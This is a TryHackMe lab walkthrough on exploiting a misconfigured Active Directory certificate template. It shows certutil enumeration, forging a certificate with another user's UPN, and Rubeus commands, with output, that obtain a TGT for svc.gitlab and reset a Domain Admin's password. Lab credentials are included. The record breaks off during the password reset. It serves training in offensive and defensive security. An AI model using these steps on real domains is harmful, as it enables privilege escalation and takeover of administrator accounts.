# AD Certificate Templates — Writeup

## Overview
### AD Certificate Templates — Writeup
### AD Certificate Templates — Writeup
----
Walkthrough on the exploitation of misconfigured AD certificate templates
---
![](https://media.discordapp.net/attachments/937050619674492980/939892264002535444/cert_service.jpg?width=1900&height=300)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a911b3ab790199d12f39da937fb656aa.png)
### Introduction
Start Machine
This room explores the Active Directory Certificate Service (AD CS) and the misconfigurations seen with certificate templates.
Research done and released as a whitepaper by SpecterOps showed that it was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement. Based on the severity of the misconfiguration, it could possibly allow any low-privileged user on the AD domain to escalate their privilege to that of an Enterprise Domain Admin with just a few clicks!
This room provides a walkthrough on how to enumerate misconfigured templates and create a privilege escalation exploit using them. The room is based heavily on the research done by SpecterOps, but only covers a single exploit path for certificates. For more information on AD CS exploitation, please read their [whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2).
Start the VM to begin the room. You will be using RDP to connect, so make sure to either use the THM VPN or AttackBox and then RDP with an RDP client such as Remmina. The following low privileged credentials are provided below. Please allow around 5 minutes for the machine to fully boot.
**Username:** `thm`
**Password:** `Password1@`
**Domain:** `lunar.eruca.com`
Answer the questions below
Read the above
Completed
### A brief look at certificate templates
Windows Active Directory (AD) is not just for identity and access management but provides a significant amount of services to help you run and manage your organisation. A lot of these services are less commonly known or used, meaning they are often overlooked when security hardening is performed. One of these services is the Active Directory Certificate Services (AD CS).
When talking about certificates, we usually only think about the most common ones, such as those used to upgrade website traffic to HTTPS. But these are usually only used for applications that the organisation exposes to the internet. What about all those applications running on the internal network? Do we now have to give them internet access to allow them to request a certificate from a trusted Certificate Authority (CA)? Well, not really. Cue AD CS.
AD CS is Microsoft's Public Key Infrastructure (PKI) implementation. Since AD provides a level of trust in an organisation, it can be used as a CA to prove and delegate trust. AD CS is used for several things such as encrypting file systems, creating and verifying digital signatures, and even user authentication, which makes it a promising avenue for attackers. What makes it an even more dangerous attack vector, is that certificates can survive credential rotation, meaning even if a compromised account's password is reset, that would do nothing to invalidate the maliciously generated certificate, providing persistent credential theft for up to 10 years! The diagram below shows what the flow for certificate requests and generation looks like (taken from SpecterOps whitepaper):
Since AD CS is such a privileged function, it normally runs on selected domain controllers. Meaning normal users can't really interact with the service directly. On the other side of the coin, organisations tend to be too large to have an administrator create and distribute each certificate manually. This is where certificate templates come in. Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request a certificate themselves. These templates have parameters that say which user can request the certificate and what is required. What SpecterOps has found, was that specific combinations of these parameters can be incredibly toxic and be abused for privilege escalation and persistent access!
Before we dive deeper into certificate abuse, some terminology:
-   PKI - Public Key Infrastructure is a system that manages certificates and public key encryption
-   AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
-   CA - Certificate Authority is a PKI that issues certificates
-   Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
-   CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
-   EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used
Answer the questions below
Read the above
Completed
What does the user create to ask the CA for a certificate?
*Certificate Signing Request*
What is the name of Microsoft's PKI implementation?
*Active Directory Certificate Services*

## Enumeration
The first step in this path is to enumerate all certificate templates to identify vulnerable ones and understand what is required to exploit them.
Luckily, Windows has some awesome built-in tools that can be used to enumerate all certificate templates and their associated policies. The most common approach is to use certutil. If we have access to a domain-joined computer and are authenticated to the domain, we can execute the following command in a cmd window to enumerate all templates and store them in a file:
`certutil -v -template > cert_templates.txt   `
You should get output like this in the textfile:
The command will provide a bunch of output that may be difficult to read, but we are looking for some key indicators that will tell us that one of the templates is vulnerable. In the output, each template is denoted by `Template[X]` where X is the number. This can be used if you want to split the output from a single template.
The specific toxic parameter set that we are looking for is one that has the following:
-   A template where we have the relevant permissions to request the certificate or where we have an account with those permissions
-   A template that allows client authentication, meaning we can use it for Kerberos authentication
-   A template that allows us to alter the subject alternative name (SAN)
**Parameter 1: Relevant Permissions**
We need to have the permissions to generate a certificate request in order for this exploit to work. We are essentially looking for a template where our user has either the _**Allow Enroll**_ or **_Allow Full Control_** permission. You will probably never find a certificate where you have the _Allow Full Control_ permission. However, if you do, congratulations! You can misconfigure the template yourself to make it vulnerable! But for now, let's focus on _Allow Enroll._
It is not as simple as just grepping through the output for the keywords **_Allow Enroll_** and your AD account, since certificate template permissions are in most cases assigned to AD groups, not directly to AD users. So you will have to grep for all **_Allow Enroll_** keywords and review the output to see if any of the returned groups match groups that your user belongs to. If you need to find your own groups, you can use this command:
`net user <username> /domain`
There are two groups that will be fairly common for certificates:
-   Domain Users - This means in most cases that any authenticated users can request the certificate
-   Domain Computers - This means that the machine account of a domain-joined host can request the certificate. If we have admin rights over any machine, we can request the certificate on behalf of the machine account
However, it is usually wise to review all certificate permissions, as it might point you in the direction of an account that will be in your reach to compromise.
**Parameter 2: Client Authentication**
Once we've shortened the list to certificate templates that we are allowed to request, the next step is to ensure that the certificate has the _**Client Authentication**_ EKU. This EKU means that the certificate can be used for Kerberos authentication. There are other ways to exploit certificates, but for this room, this EKU will be the primary focus.
Therefore, for now, we are only interested in certificates that allow Client Authentication, meaning the certificate will be granted, given that we are the authenticated user on the machine requesting the certificate.
To find these, we need to review the EKU properties of the template and ensure that the words **_Client Authentication_** is provided. Other templates that do not match this, for now, we can discard.
**Parameter 3: Client Specifies SAN**
Last but definitely not least, we need to verify that the template allows us, the certificate client, to specify the Subject Alternative Name (SAN). The SAN is usually something like the URL of the website that we are looking to encrypt. For example: tryhackme.com. However, if we have the ability to control the SAN, we can leverage the certificate to actually generate a kerberos ticket for any AD account of our choosing!
To find these templates, we grep for the **_CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_** property flag that should be set to 1. This indicates that we can specify the SAN ourselves.
If we find a template where all three of these conditions are met, then we are in business and are a few clicks away from full Enterprise Admin rights! It should be noted that there are other conditions as well, like the fact that we want a certificate that does not go through an approval process to limit human intervention, but the full list of these parameters are not covered here simply because, by default, the initial certification template generation makes the template vulnerable. These additional template restrictions and EKUs are discussed at length in the whitepaper.
Answer the questions below
```text
login using remmina

┌──(witty㉿kali)-[~/Downloads/CVE-2022-26923]
└─$ remmina                                                        
Command 'remmina' not found, but can be installed with:
sudo apt install remmina
Do you want to install it? (N/y)y

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm>cd Desktop

C:\Users\thm\Desktop>certutil -v -template > cert_templates.txt

Name: Active Directory Enrollment Policy
  Id: {163768E2-712B-4E97-A6A3-5E597F91D6F4}
  Url: ldap:
35 Templates:

  Template[0]:
  TemplatePropCommonName = Administrator
  TemplatePropFriendlyName = Administrator
  TemplatePropEKUs =
4 ObjectIds:
    1.3.6.1.4.1.311.10.3.1 Microsoft Trust List Signing
    1.3.6.1.4.1.311.10.3.4 Encrypting File System
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.5.5.7.3.2 Client Authentication

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0

  TemplatePropMajorRevision = 4
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 1
  TemplatePropMinorRevision = 1
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.1.7

  TemplatePropEnrollmentFlags = 29 (41)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)

  TemplatePropSubjectNameFlags = a6000000 (-1509949440)
    CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 2000000 (33554432)
    CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL -- 4000000 (67108864)
    CT_FLAG_SUBJECT_REQUIRE_EMAIL -- 20000000 (536870912)
    CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH -- 80000000 (-2147483648)

  TemplatePropPrivateKeyFlags = 10 (16)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
    TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0

  TemplatePropGeneralFlags = 1023a (66106)
    CT_FLAG_ADD_EMAIL -- 2
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_DEFAULT -- 10000 (65536)

  TemplatePropSecurityDescriptor = O:S-1-5-21-3330634377-1326264276-632209373-519G:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Read	NT AUTHORITY\Authenticated Users

  TemplatePropExtensions =
3 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.20.2: Flags = 0, Length = 1c
    Certificate Template Name (Certificate Type)
        Administrator

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 2e
    Enhanced Key Usage
        Microsoft Trust List Signing (1.3.6.1.4.1.311.10.3.1)
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Client Authentication (1.3.6.1.5.5.7.3.2)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks

  Template[1]:
  TemplatePropCommonName = ClientAuth
  TemplatePropFriendlyName = Authenticated Session
  TemplatePropEKUs =
1 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0
    2: Microsoft Base DSS Cryptographic Provider

  TemplatePropMajorRevision = 3
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 1
  TemplatePropMinorRevision = 1
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.1.4

  TemplatePropEnrollmentFlags = 20 (32)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)

  TemplatePropSubjectNameFlags = 82000000 (-2113929216)
    CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 2000000 (33554432)
    CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH -- 80000000 (-2147483648)

  TemplatePropPrivateKeyFlags = 0
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
    TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0

  TemplatePropGeneralFlags = 10220 (66080)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_DEFAULT -- 10000 (65536)

  TemplatePropSecurityDescriptor = O:S-1-5-21-3330634377-1326264276-632209373-519G:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Domain Users
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Read	NT AUTHORITY\Authenticated Users

  TemplatePropExtensions =
3 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.20.2: Flags = 0, Length = 16
    Certificate Template Name (Certificate Type)
        ClientAuth

  Extension[1]:
    2.5.29.37: Flags = 0, Length = c
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature (80)

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks

  Template[2]:
  TemplatePropCommonName = EFS
  TemplatePropFriendlyName = Basic EFS
  TemplatePropEKUs =
1 ObjectIds:
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0

  TemplatePropMajorRevision = 3
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 1
  TemplatePropMinorRevision = 1
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.1.6

  TemplatePropEnrollmentFlags = 29 (41)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)

C:\Users\thm\Desktop>net user thm /domain
User name                    thm
Full Name                    Try THM. Hack Me
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/14/2022 11:54:49 AM
Password expires             Never
Password changeable          1/14/2022 11:54:49 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/16/2023 8:18:23 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Desktop Users
Global Group memberships     *Domain Users
The command completed successfully.

Template[31]:
  TemplatePropCommonName = UserRequest
  TemplatePropFriendlyName = User Request
  TemplatePropEKUs =
3 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0

  TemplatePropMajorRevision = 64 (100)
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 2
  TemplatePropMinorRevision = a (10)
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.13950390.3651808 User Request

  TemplatePropV1ApplicationPolicy =
3 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropEnrollmentFlags = 19 (25)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16)

  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1

  TemplatePropPrivateKeyFlags = 1010010 (16842768)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)

  TemplatePropGeneralFlags = 2023a (131642)
    CT_FLAG_ADD_EMAIL -- 2
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_MODIFIED -- 20000 (131072)

  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;AU)(OA;;CR;a05b8cc2-17bc-4802-a710-e7c15ab866a2;;AU)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Domain Users
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Enroll	NT AUTHORITY\Authenticated Users
    Allow Auto-Enroll	NT AUTHORITY\Authenticated Users
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Administrator
    Allow Read	NT AUTHORITY\Authenticated Users

  TemplatePropExtensions =
4 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 31
    Certificate Template Information
        Template=User Request(1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.13950390.3651808)
        Major Version Number=100
        Minor Version Number=10

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 22
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  Extension[3]:
    1.3.6.1.4.1.311.21.10: Flags = 0, Length = 28
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [2]Application Certificate Policy:
             Policy Identifier=Secure Email
        [3]Application Certificate Policy:
             Policy Identifier=Encrypting File System

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks
```
What AD group will allow all AD user accounts to request a certificate?
*Domain Users*
What AD group will allow all domain-joined computers to request a certificate?
*Domain Computers*
Which EKU allows us to use the generated certificate for Kerberos authentication?
*Client Authentication*
Which certificate template is misconfigured based on the three provided parameters?
*User Request*
### Generating a malicious certificate
Now that we identified a certificate template that we can exploit, it is time to generate the certificate request. You could do this step from the command line if you wanted to, but why make your life difficult when Microsoft just allows you to do hacking through the click of some buttons!
To request a new certificate, we will use the Microsoft Management Console. Load up the console by typing _**mmc**_ in a run window:
This will bring up the MMC window. In this window, click **File -> Add/Remove Snap-in...**
In this window, you want to add the **Certificates** snap-in:
Although it will add the snap-in directly if you had administration privileged, you would see the next prompt:
This prompt allows you to impersonate service accounts or the machine account. But you can only perform these options if you have administration privileges on the host, which we currently don't have. You can now close the snap-in manager and return to the main console screen. Expand the **Certificates** option, right-click on **Personal**, select **All Tasks**, and click on **Request New Certificate**:
For the first option, just select **Next** twice, since we are using the default CA, you should see the following screen showing available templates:
As you can see from the screen, we need to complete the information for our certificate before we can enroll it. Click the "More information is required to enroll this certificate." link to start the process.
On this screen, we need to be very specific about the information that we provide. In order to ensure that the certificate can be exploited for a Kerberos ticket of a privileged user, we require the User Principal Name of the user we wish to impersonate. This can be found using the AD-RSAT tools or something like the PowerView scripts.
For this example, we will impersonate one of the DA users in this domain. Let's target the _**svc.gitlab**_ account since it is a service account, meaning Kerberos authentication is likely expected from this account. The UPN of this account is **svc.gitlab@lunar.eruca.com**. Using this information we can complete the certificate properties.
First, we change the **Subject name** Type to **Common Name** and provide the name we want for this certificate. Then, we alter the **Alternative name** Type to **User principal name** and provide the UPN of the account we want to impersonate. The values should look like this:
We can then add these properties to our certificate:
When we click okay, we will now see that we are allowed to enroll this certificate:
Complete the enrollment of the certificate. Once enrolled you will be able to view the certificate under your personal certificates:
If we review the details of the certificate, you will see that the SAN now specifies the UPN we want to impersonate, definitely not the SAN of our web server!
Congratulations, you have just generated a certificate that will provide you with persistent authentication to the domain for the next two years! The last step is to actually export the certificate to get it ready for use. Right-click on the certificate, select **All Tasks,** and then **Export**:
Follow the prompts but make sure to export the private key as well:
The certificate should be in pfx format. Furthermore, configure a password for the certificate to ensure the private key is exported:
Select a filename and export the certificate:
Now your certificate is ready for exploitation!
Answer the questions below
```text

```
![[Pasted image 20230216162756.png]]
![[Pasted image 20230216164950.png]]
![[Pasted image 20230216165250.png]]
In which field do we inject the User Principal Name of the account we want to impersonate?
Called SAN for short
*Subject Alternative Name*
If we had administrative access, when adding the snap-in, which option would we select to use the machine account of the host instead of our authenticated AD account for certificate generation?
You make this selection when prompted: "This snap-in will always manage certificates for:"
*Computer Account*
Follow the steps above and generate your very own privilege escalation certificate
Completed
### User impersonation through a certificate
Now we can finally impersonate a user. To perform this, two steps are required:
-   Use the certificate to request a Kerberos ticket granting ticket (TGT)
-   Load the Kerberos TGT into your hacking platform of choice
For the first step, we will be using [Rubeus](https://github.com/GhostPack/Rubeus). An already compiled version is available in the `C:\THMTools\` directory. Open a command prompt window and navigate to this directory. We will use the following command to request the TGT:
`Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:`
Let's break down the parameters:
-   **/user** - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
-   **/enctype** -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
-   **/certificate** - Path to the certificate we have generated
-   **/password** - The password for our certificate file
-   **/outfile** - The file where our TGT will be output to
-   **/domain** - The FQDN of the domain we are currently attacking
-   **/dc** - The IP of the domain controller where we are requesting the TGT from. Usually it is best to select a DC that has a CA service running
Once we execute the command, we should receive our TGT:
TGT Request
```shell-session
C:\THMTools> .\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             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
       
         ServiceName              :  krbtgt/lunar.eruca.com
         ServiceRealm             :  LUNAR.ERUCA.COM
         UserName                 :  svc.gitlab
         UserRealm                :  LUNAR.ERUCA.COM
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```
We now need to use this TGT to gain access. This can be done using your favorite hacking framework like metasploit, cobaltstrike, or covenant. However, for the purpose of this walkthrough, we will be using Rubeus again. We will use the ticket to alter the password of one of the domain administrators. This will allow us to use the DA's credentials to log into the Domain Controller as administrator to recover the final flag. Open the **Active Directory Users and Computers** application and explore the domain structure, looking for the DAs:
Select one of the DAs to target and use the following command to alter their password:
`Rubeus.exe changepw /ticket:<path to ticket file> /new:<new password for user> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<username of targeted DA>`
Once the command executes, it should alter the password for the associated DA account:
Resetting a user's password
```shell-session
C:\THMTools> .\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
           ______        _
          (_____ \      | |
           _____) )_   _| |__  _____ _   _  ___
          |  __  /| | | |  _ \| ___ | | | |/___)
          | |  \ \| |_| | |_) ) ____| |_| |___ |
          |_|   |_|____/|____/|_____)____/(___/
        
          v2.0.0
        
        [*] Action: Reset User Password (AoratoPw)
        
        [*] Using domain controller: LUNDC.lunar.eruca.com (10.10.69.219)
        [*] Resetting password for target user: lunar.eruca.com\da-nread
        [*] New password value: Tryhackme!
        [*] Building AP-REQ for the MS Kpassword request
